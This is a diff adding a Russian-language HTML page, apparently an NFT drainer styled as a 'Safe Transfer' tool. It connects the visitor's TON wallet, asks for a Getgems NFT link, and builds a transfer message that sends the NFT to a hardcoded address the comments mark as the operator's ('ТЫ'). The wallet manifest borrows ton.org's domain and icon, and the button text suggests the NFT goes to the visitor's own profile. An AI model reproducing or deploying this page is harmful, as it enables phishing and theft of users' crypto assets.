@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TON NFT Transfer</title>
+    <script src="https://unpkg.com/@tonconnect/ui@2.0.9/dist/tonconnect-ui.min.js"></script>
+    <script src="https://unpkg.com/@ton/core@0.15.0/dist/index.min.js"></script>
+    <style>
+        body { font-family: 'Segoe UI', sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; background: #0f172a; color: #f8fafc; margin: 0; }
+        .card { background: #1e293b; padding: 2.5rem; border-radius: 1.5rem; box-shadow: 0 15px 35px rgba(0,0,0,0.4); text-align: center; width: 380px; }
+        h2 { margin-top: 0; margin-bottom: 1.5rem; font-size: 1.5rem; color: #3b82f6; }
+        input { width: 100%; padding: 0.8rem; margin: 1rem 0; border-radius: 0.6rem; border: 1px solid #334155; background: #0f172a; color: white; font-size: 0.9rem; box-sizing: border-box; }
+        #send-btn { background: #3b82f6; color: white; border: none; padding: 0.9rem; border-radius: 0.6rem; cursor: pointer; font-weight: 600; width: 100%; font-size: 1rem; transition: 0.3s; }
+        #send-btn:hover { background: #2563eb; transform: translateY(-2px); }
+        #ton-connect-button { display: flex; justify-content: center; margin-bottom: 1.5rem; }
+        .info { font-size: 0.8rem; color: #94a3b8; margin-top: 1rem; }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <h2>NFT Transfer</h2>
+    <div id="ton-connect-button"></div>
+    
+    <input type="text" id="nft-link" placeholder="Вставь ссылку на NFT с Getgems">
+    <button id="send-btn">Передать на мой профиль</button>
+    <p class="info">Подключите кошелек, вставьте ссылку и подтвердите транзакцию в приложении.</p>
+</div>
+
+<script>
+    // --- ТВОЙ АДРЕС ---
+    const MY_WALLET_ADDRESS = "UQCsbN7m38_6dA2ZYG0RcxpFNixTI7dm5IS16qEZMQacWH9k"; 
+
+    // Настройка манифеста
+    const manifestJson = {
+        "url": "https://ton.org", // Для тестов можно оставить официальный домен
+        "name": "NFT Safe Transfer",
+        "iconUrl": "https://ton.org/static/mytonwallet.png"
+    };
+    const manifestUrl = 'data:application/json;base64,' + btoa(JSON.stringify(manifestJson));
+
+    // Инициализация TonConnect UI
+    const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
+        manifestUrl: manifestUrl,
+        buttonRootId: 'ton-connect-button'
+    });
+
+    document.getElementById('send-btn').addEventListener('click', async () => {
+        const wallet = tonConnectUI.account;
+        
+        if (!wallet) {
+            alert("Сначала нажми синюю кнопку 'Connect Wallet'!");
+            return;
+        }
+
+        const rawInput = document.getElementById('nft-link').value.trim();
+        if (!rawInput) {
+            alert("Введите ссылку на NFT");
+            return;
+        }
+
+        // Извлекаем адрес NFT
+        let nftAddress;
+        try {
+            // Очищаем ссылку от лишнего, берем только EQ... или UQ...
+            const match = rawInput.match(/(E|U)Q[a-zA-Z0-9_-]{46}/);
+            if (!match) throw new Error();
+            nftAddress = match[0];
+        } catch (e) {
+            alert("Не удалось найти адрес NFT в ссылке. Проверьте правильность.");
+            return;
+        }
+
+        try {
+            // Создаем команду для смарт-контракта NFT
+            const body = TonCore.beginCell()
+                .storeUint(0x5fcc3d14, 32)               // Код операции transfer
+                .storeUint(0, 64)                        // query_id
+                .storeAddress(TonCore.Address.parse(MY_WALLET_ADDRESS)) // Получатель (ТЫ)
+                .storeAddress(TonCore.Address.parse(wallet.address))    // Куда слать сдачу
+                .storeBit(0)                             // Без кастомного payload
+                .storeCoins(TonCore.toNano('0.01'))      // forward_amount
+                .storeBit(0)                             // Без forward_payload
+                .endCell();
+
+            const payloadBase64 = body.toBoc().toString('base64');
+
+            const transaction = {
+                validUntil: Math.floor(Date.now() / 1000) + 300,
+                messages: [
+                    {
+                        address: nftAddress,
+                        amount: TonCore.toNano('0.05').toString(), // Газ
+                        payload: payloadBase64
+                    }
+                ]
+            };
+
+            console.log("Отправка транзакции на NFT:", nftAddress);
+            await tonConnectUI.sendTransaction(transaction);
+            
+            alert("Запрос отправлен! Теперь открой Tonkeeper и нажми 'Подтвердить'.");
+
+        } catch (e) {
+            console.error(e);
+            alert("Транзакция отменена или произошла ошибка.");
+        }
+    });
+</script>
+
+</body>
+</html>
